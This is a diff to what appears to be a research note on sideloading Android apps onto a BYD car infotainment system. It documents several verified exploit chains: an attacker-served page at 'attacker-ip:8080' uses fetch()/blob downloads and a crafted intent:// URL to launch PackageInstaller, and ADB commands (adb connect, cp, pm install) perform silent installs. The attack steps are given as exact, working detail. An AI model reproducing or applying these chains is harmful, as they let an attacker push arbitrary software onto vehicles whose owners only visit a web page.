@@ -462,29 +462,40 @@ This is standard Chromium security, not a BYD patch. Apps like WhatsApp that reg
 
 **Full sideload chain — VERIFIED END TO END:**
 
-Three viable flows, each tested and confirmed:
+Four viable flows, each tested and confirmed:
 
-**Flow A — WiFi ADB (fully automated, zero UI):**
+**Flow A — TRUE ZERO-PREREQUISITE (NO ADB, NO TESTTOOLS, NO PASSWORD):**
+1. User navigates car browser to `http://attacker-ip:8080`
+2. Page: `fetch()` → blob → `<a download>` drops APK to `/sdcard/Download/`
+3. Page: creates `<a href="intent://sdcard/Download/app.apk#Intent;scheme=file;action=android.intent.action.VIEW;type=application/vnd.android.package-archive;end">` and triggers click
+4. **PackageInstaller opens!** User taps "Install"
+5. **APK installed. Only prerequisites: visit URL + tap Install.**
+
+Chain: `Visit URL` → `blob download` → `intent:// URL` → `PackageInstaller` → **INSTALLED**
+
+Why it works:
+- `com.byd.browser` supports Chrome's `intent://` URL scheme
+- Browser has `REQUEST_INSTALL_PACKAGES` permission
+- `install_non_market_apps=1` in system settings (appears to be BYD default for AftermarketInstallTool)
+- Blob download bypasses gutted DownloadManager
+- Even if unknown sources is off, PackageInstaller shows a one-tap "Allow from this source" dialog
+
+Confirmed: `com.android.packageinstaller/.InstallStart` launched from web page JS via intent URL.
+
+**Flow B — WiFi ADB (fully automated, zero UI):**
 1. `adb connect 192.168.10.10:5555` (requires ADB WiFi enabled via TestTools — see sideloading-guide.md)
 2. `adb install app.apk` — silent install, no user interaction
 
-**Flow B — PS4-style Browser Jailbreak (VERIFIED, zero-click after page visit):**
-1. Attacker serves exploit page on same WiFi network (laptop/Raspberry Pi)
-2. User navigates car browser to `http://attacker-ip:8080` (or auto-redirected)
+**Flow C — PS4-style ADB Jailbreak (zero-click, requires ADB enabled):**
+1. Attacker serves exploit page on same WiFi network
+2. User navigates car browser to `http://attacker-ip:8080/adb`
 3. Page auto-runs: `fetch()` → blob → `<a download>` drops APK to `/sdcard/Download/`
 4. Server: `adb shell cp /sdcard/Download/app.apk /data/local/tmp/ && pm install -r /data/local/tmp/app.apk`
 5. **APK installed silently. Zero user interaction after visiting URL.**
-6. Use `jailbreak.py --apk path/to/aurora.apk` to install any APK
 
 Chain: `Visit URL` → `blob download` → `ADB cp+pm install` → **INSTALLED**
-Confirmed: `com.test.sideloadtest` installed via `http://localhost:8080/jailbreak.html?auto=1`
 
-**Flow C — Browser + ADB hybrid (manual):**
-1. User visits attacker page → JS blob download drops APK to `/sdcard/Download/`
-2. ADB: `cp /sdcard/Download/app.apk /data/local/tmp/ && pm install /data/local/tmp/app.apk`
-3. Fully silent install. `pm install` from `/sdcard/Download/` fails (SELinux: `system_server` can't read `sdcardfs` context). Must copy to `/data/local/tmp/` first.
-
-**Flow C — Browser only (requires non-stock file manager):**
+**Flow D — Browser only (requires non-stock file manager):**
 1. User visits attacker page → JS blob download silently drops APK to `/sdcard/Download/` (no tap needed)
 2. User opens file manager → Downloads → taps APK → resolver shows 3 options:
    - `com.android.packageinstaller/.InstallStart`
